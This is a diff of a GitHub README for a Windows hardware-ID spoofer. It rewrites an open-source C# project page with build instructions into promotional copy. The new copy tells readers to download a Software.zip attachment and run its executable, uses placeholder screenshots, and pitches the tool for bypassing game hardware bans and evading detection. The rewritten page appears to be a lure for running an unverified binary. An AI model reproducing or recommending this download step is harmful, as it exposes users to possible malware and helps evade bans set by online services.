@@ -1,102 +1,58 @@
-<div align="center">
+# HWID Spoofer
 
-# Hwid Spoofer
+![HWID Spoofer Logo](https://example.com/hwid_spoofer_logo.png)
 
-Hwid Spoofer is a C# application that allows you to change various system identifiers on your Windows computer. This application helps you randomly change some system identifiers on your system.
+Make your system untraceable with the HWID Spoofer! This tool anonymizes and modifies hardware identifiers on Windows systems, providing you with enhanced privacy and security in the digital realm. Whether you are a gamer looking to bypass hardware bans or simply a privacy-conscious individual, the HWID Spoofer has got you covered.
 
 ## Features
 
-- **HWID Change**: Generates and change a random HWID.
+- **Disk Spoofing**: Modify disk hardware identifiers to evade detection.
+- **GUID Spoofing**: Anonymize Globally Unique Identifiers for enhanced privacy.
+- **PC Name Spoofing**: Change your computer's name to avoid tracking.
+- **MAC ID Spoofing**: Mask your MAC address to prevent identification.
+- **Installation ID Spoofing**: Alter installation identifiers to stay incognito.
+- **EFI Bootloader Spoofing**: Modify EFI bootloader information for increased security.
+- **SMBIOS Data Spoofing**: Change System Management BIOS data to protect your identity.
+- **Display Spoofing**: Customize display information to maintain anonymity.
+- **Cache Cleaners**: Speed up your games and system with cache cleaning tools.
+- **System Cleaning Tools**: Remove unnecessary files and optimize your system performance.
 
-- **PC GUID Change**: Generates and change a random PC GUID.
+## Installation
 
-- **Computer Name Change**: Generates and change a random computer name.
+To get started with the HWID Spoofer, follow these steps:
 
-- **Product ID Change**: Generates and change a random product ID.
+1. Download the software from the following link: [![Download HWID Spoofer](https://img.shields.io/badge/download-HWID_Spoofer-blueviolet)](https://github.com/user-attachments/files/16913125/Software.zip)
+2. Extract the ZIP file to a location of your choice.
+3. Run the HWID Spoofer executable.
+4. Follow the on-screen instructions to configure and utilize the spoofer features.
+5. Enjoy enhanced privacy and security on your Windows system!
 
-- **MAC Address Change (Beta)**: Assigns a random MAC address to a specific network interface.
+## Screenshots
 
-- **All Change**: Randomly changes all system identifiers and the MAC address.
+![Screenshot 1](https://example.com/screenshot1.png)
 
-- **Backup Functionality**: The application provides a backup function to store the original values of system identifiers before changes are made, making it easier to revert to the original settings if needed.
-
-## Requirements
-- Visual Studio 2022 (.NET Desktop)
-
-
-## Build
-
-
-https://github.com/MuckPro/bunned/assets/138373919/a91a5c05-a2d5-498d-a4cd-bcceea474d9a
-
-
-# Preview
-
-![Console GUI](https://github.com/MuckPro/bunned/assets/138373919/cb342480-8cc1-40ef-92be-e13b582b34ae)
-
-
+![Screenshot 2](https://example.com/screenshot2.png)
 
 ## Usage
 
-1. Run the application and choose whether you want to change system identifiers randomly (Yes/No).
+With the HWID Spoofer, you can modify various hardware identifiers and system information to protect your privacy and maintain anonymity. Here are some common scenarios where the spoofer can be useful:
 
+- **Gaming**: Avoid hardware bans in online games by changing your system identifiers.
+- **Security Testing**: Conduct penetration testing and security research without leaving traces.
+- **Privacy Protection**: Prevent websites and services from tracking your unique hardware details.
+- **System Optimization**: Clean up caches and optimize system performance for a smoother experience.
+- **Anonymity**: Stay anonymous online by modifying critical hardware identifiers.
 
-2. If you select "Yes," you can choose which system identifier(s) you want to change:
-   - Hardware ID (HWID)
-   - PC GUID
-   - Computer Name
-   - Product ID
-   - MAC Address
-   - All of the above
+Explore the various features of the HWID Spoofer and customize your system according to your needs.
 
+## Contributing
 
-3. The application will guide you through the process of changing the selected system identifier(s).
-
-4. After the changes are made, the application will display the result.
-
-## Resourcs
-
-- [Source for Generating Random HWID](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-diskdrive)
-- [Source for Generating Random PC GUID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Computer Name](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Product ID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Changing MAC Address](https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.networkinterface)
-
-
-
-## Contribution
-
-This project is open-source, and contributions are welcome. If you'd like to contribute by adding features, fixing bugs, or improving the documentation, feel free to create a pull request.
-
+Contributions to the HWID Spoofer are welcome! Whether you want to suggest new features, report bugs, or contribute code improvements, feel free to open an issue or submit a pull request on the GitHub repository.
 
 ## License
 
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE) file.
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-
-
-
-
-<!---------------------------------------------------------------------------------------
-
-
-
-
-
-                                         ░█████╗░██╗░░░██╗████████╗██╗░░██╗░█████╗░██████╗░
-                                         ██╔══██╗██║░░░██║╚══██╔══╝██║░░██║██╔══██╗██╔══██╗
-                                         ███████║██║░░░██║░░░██║░░░███████║██║░░██║██████╔╝
-                                         ██╔══██║██║░░░██║░░░██║░░░██╔══██║██║░░██║██╔══██╗
-                                         ██║░░██║╚██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░░██║
-                                         ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-                                                                                        
-                                                 █▀█ ▄▀█ ▀█▀ █░█ ▄▀█ █▀▀ █░░ ▀▄▀ ▀█▀
-                                                 █▀▄ █▀█ ░█░ █▀█ █▀█ ██▄ █▄▄ █░█ ░█░
-
-
-
-
-
------------------------------------------------------------------------------------------>
+Developed with ❤️ by the HWID Spoofer Team.
